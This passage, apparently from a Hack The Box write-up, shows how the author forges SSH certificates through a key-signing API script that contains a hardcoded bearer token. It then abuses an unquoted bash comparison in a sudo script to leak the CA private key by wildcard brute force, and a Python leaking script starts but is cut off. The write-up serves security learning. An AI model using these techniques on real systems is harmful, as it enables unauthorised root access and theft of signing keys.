+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: &amp;#39;&lt;/span>$word&lt;span style="color:#b8bb26">&amp;#39; is not a supported principal.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Choose from:&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; webserver - external web servers - webadmin user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; analytics - analytics team databases - analytics user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; support - IT support server - support user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; security - SOC servers - support user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> ! -f &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$public_key_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Public key file &amp;#39;&lt;/span>$public_key_file&lt;span style="color:#b8bb26">&amp;#39; not found.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public_key&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>cat $public_key_file&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -s signserv.ssg.htb/v1/sign -d &lt;span style="color:#b8bb26">&amp;#39;{&amp;#34;pubkey&amp;#34;: &amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$public_key&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&amp;#34;, &amp;#34;username&amp;#34;: &amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$username&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&amp;#34;, &amp;#34;principals&amp;#34;: &amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$principal&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&amp;#34;}&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This script calls and api to sign ssh public keys. We can run the script and give it a public key, username, and a principal value (from &lt;code>webserver&lt;/code>, &lt;code>analytics&lt;/code>, &lt;code>support&lt;/code>, and &lt;code>security&lt;/code>). This api might be trying to sign the given public key with a CA certificate present in the host machine. To sign the pubilc key, we have to figure out valid username and principal combination. I first checked user &lt;code>root&lt;/code> and all of he mentioned principals. But none of them worked, then after some more trial and error I found a valid combo &lt;code>support:support&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf-support
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## copy the pub file into the htb machine and run the script&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash sign_key_api.sh ./ctf-support.pub support support
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will generate a &lt;code>cert&lt;/code> file and we can login to ssh using this cert file and the private key. Note that there&amp;rsquo;s to ssh port open &lt;code>22&lt;/code> and &lt;code>2222&lt;/code>. The &lt;code>22&lt;/code> port is for the docker and maybe the &lt;code>2222&lt;/code> is for the host.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh support@10.10.11.27 -p &lt;span style="color:#d3869b">2222&lt;/span> -i ctf-support -o CertificateFile&lt;span style="color:#fe8019">=&lt;/span>support.cert
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809202958.webp">&lt;/figure>
+&lt;h3 id="privilege-escalation-vector">Privilege Escalation vector&lt;/h3>
+&lt;p>I checked the other users in the machine&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809205216.webp">&lt;/figure>
+&lt;p>There&amp;rsquo;s a zzinter user in this machine. We can try generating another &lt;code>cert&lt;/code> file using the previous script for this user. I tried all 4 principals mentioned in the script but none of them worked.
+We can look inside &lt;code>/etc/ssh&lt;/code> to know how this is configured. I recomend you to check this blog to learn more about CAs and Principals &lt;a href="https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d">https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d&lt;/a>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809205819.webp">&lt;/figure>
+&lt;p>root login is enabled in the &lt;code>sshd_config&lt;/code> file. If we check the &lt;code>/etc/ssh/sshd_conf.d/sshcerts.conf&lt;/code> we can see where the principals are stored&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809205926.webp">&lt;/figure>
+&lt;p>As we can see there are 2 more principals that were not mentioned in the previous script that used to sign the ssh public key.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809210224.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s copy the previous script, ad these two new principals to the script and try login as root.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129222723.webp">&lt;/figure>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf-root
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash sign_key_api.sh ./ctf-root.pub root root_user
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129222955.webp">&lt;/figure>
+&lt;p>We can&amp;rsquo;t sign the key for root user.&lt;/p>
+&lt;p>Let&amp;rsquo;s try zzinter&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf-zzinter
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash sign_key_api.sh ./ctf-zzinter.pub zzinter zzinter_temp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129223252.webp">&lt;/figure>
+&lt;p>We got an output, and if we tried to log in using this cert file as user zzinter&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh zzinter@10.10.11.27 -p &lt;span style="color:#d3869b">2222&lt;/span> -i ctf-zzinter -o CertificateFile&lt;span style="color:#fe8019">=&lt;/span>zzinter.cert
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We logged in as zzinter&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809210913.webp">&lt;/figure>
+&lt;p>User zzinter can run &lt;code>/opt/sign_key.sh&lt;/code> with sudo privileges&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809211043.webp">&lt;/figure>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>usage &lt;span style="color:#fe8019">()&lt;/span> &lt;span style="color:#fe8019">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Usage: &lt;/span>$0&lt;span style="color:#b8bb26"> &amp;lt;ca_file&amp;gt; &amp;lt;public_key_file&amp;gt; &amp;lt;username&amp;gt; &amp;lt;principal&amp;gt; &amp;lt;serial&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">exit&lt;/span> &lt;span style="color:#d3869b">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$#&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -ne &lt;span style="color:#d3869b">5&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ca_file&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$1&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public_key_file&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$2&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$3&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>principal&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$4&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>serial&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$5&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> ! -f &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$ca_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: CA file &amp;#39;&lt;/span>$ca_file&lt;span style="color:#b8bb26">&amp;#39; not found.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> $ca &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;/etc/ssh/ca-it&amp;#34;&lt;/span> &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Use API for signing with this CA.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>itca&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>cat /etc/ssh/ca-it&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ca&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>cat &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$ca_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> $itca &lt;span style="color:#fe8019">==&lt;/span> $ca &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Use API for signing with this CA.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> ! -f &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$public_key_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Public key file &amp;#39;&lt;/span>$public_key_file&lt;span style="color:#b8bb26">&amp;#39; not found.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>supported_principals&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;webserver,analytics,support,security&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>IFS&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;,&amp;#39;&lt;/span> &lt;span style="color:#fabd2f">read&lt;/span> -ra principal &lt;span style="color:#fe8019">&amp;lt;&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$principal_str&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">for&lt;/span> word in &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">${&lt;/span>principal[@]&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> ! &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$supported_principals&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> | grep -qw &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$word&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: &amp;#39;&lt;/span>$word&lt;span style="color:#b8bb26">&amp;#39; is not a supported principal.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Choose from:&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; webserver - external web servers - webadmin user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; analytics - analytics team databases - analytics user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; support - IT support server - support user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; security - SOC servers - support user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> ! &lt;span style="color:#fe8019">[[&lt;/span> $serial &lt;span style="color:#fe8019">=&lt;/span>~ ^&lt;span style="color:#fe8019">[&lt;/span>0-9&lt;span style="color:#fe8019">]&lt;/span>+$ &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: &amp;#39;&lt;/span>$serial&lt;span style="color:#b8bb26">&amp;#39; is not a number.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh-keygen -s &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$ca_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -z &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$serial&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -I &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$username&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -V -1w:forever -n &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$principals&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$public_key_name&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is similar to the previous script, but in here instead of using API, we can directly provide the &lt;code>ca_file&lt;/code>. There&amp;rsquo;s an if statement that checks if the provided &lt;code>ca_file&lt;/code> is &lt;code>/etc/ssh/ca-it&lt;/code>, if it is true then it will print the usage and exit.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129224415.webp">&lt;/figure>
+&lt;p>The one thing to notice here is that the script first reads the content of both &lt;code>/etc/ssh/ca-it&lt;/code> and the file we provide and tries to match the content. And specifically in that line:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> $itca &lt;span style="color:#fe8019">==&lt;/span> $ca &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It tries to match the content without surrounding the variables in quotest &lt;code>&amp;quot;&lt;/code>, which makes it possible to pattern match. Let&amp;rsquo;s explain that with an example:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>pass&lt;span style="color:#fe8019">=&lt;/span>$1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root_pass&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;secretpass&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> $root_pass &lt;span style="color:#fe8019">==&lt;/span> $pass &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Access granted!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Wrong password!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here when we enter &lt;code>*&lt;/code> as the password, the script will match it with the password and we can easily bypass the check.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129205356.webp">&lt;/figure>
+&lt;p>In this example th password is hardcoded inside the script. Now what if the script have suid bit set and reads the password from another file which only the root user have permission to. Another thing we can try is exfiltrate the password by exploiting this wilcard matching.
+For example we can try to find the first letter by trying all the letter one by one and add &lt;code>*&lt;/code> at the end. Since the password here is &lt;code>secretpass&lt;/code>, the password &lt;code>a*&lt;/code> fails and &lt;code>s*&lt;/code> works.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129205900.webp">&lt;/figure>
+&lt;p>We can keep doing this until we exfiltrate the whole password using a small script.
+The same method can be applied to create a script to leak the content of &lt;code>/etc/ssh/ca-it&lt;/code> file.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> string
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> subprocess
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> os
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chars &lt;span style="color:#fe8019">=&lt;/span> string&lt;span style="color:#fe8019">.&lt;/span>ascii_uppercase &lt;span style="color:#fe8019">+&lt;/span> string&lt;span style="color:#fe8019">.&lt;/span>ascii_lowercase &lt;span style="color:#fe8019">+&lt;/span> string&lt;span style="color:#fe8019">.&lt;/span>digits &lt;span style="color:#fe8019">+&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;+/&lt;/span>&lt;span style="color:#b8bb26">\n&lt;/span>&lt;span style="color:#b8bb26">-= &amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ca &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;test-ca&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>leaked_key&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;-----BEGIN OPENSSH PRIVATE KEY-----
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">is_valid_ca&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output &lt;span style="color:#fe8019">=&lt;/span> subprocess&lt;span style="color:#fe8019">.&lt;/span>run(
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">f&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;sudo /opt/sign_key.sh &lt;/span>&lt;span style="color:#b8bb26">{&lt;/span>ca&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26"> ctf-root.pub root root_user 1337&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> stdout&lt;span style="color:#fe8019">=&lt;/span>subprocess&lt;span style="color:#fe8019">.&lt;/span>PIPE,
